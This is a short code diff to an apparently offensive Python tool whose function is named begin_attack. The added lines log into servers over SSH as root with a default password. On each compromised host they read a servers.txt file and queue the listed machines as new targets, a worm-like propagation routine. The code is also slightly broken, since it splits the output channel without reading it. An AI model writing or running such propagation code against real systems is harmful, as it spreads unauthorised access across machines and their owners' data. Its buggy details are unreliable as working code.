@@ -104,6 +104,22 @@ def begin_attack(client):
             client.connect(server.host, server.ssh_port, username=ROOT, password=DEFAULT_PASS)
         except Exception as e:
             print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
+            q.put(server)
+            continue
+
+        # at this point we are connected via SSH
+        # gets the servers.txt
+        stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
+        new_servers = stdout.split("\n")
+        print new_servers
+        for s in new_servers:
+            host, port = get_host_port(s)
+            # if we have not seen this ip_address before
+            if not (host in ip_list):
+                # create the compObj and add it to be seen in the queue
+                compObj = Computer(host, port)
+                ip_list.append(host)
+                q.put(compObj)
 
 
     # verbose('Now forwarding port %d to %s:%d ...' % (options.port, remote[0], remote[1]))
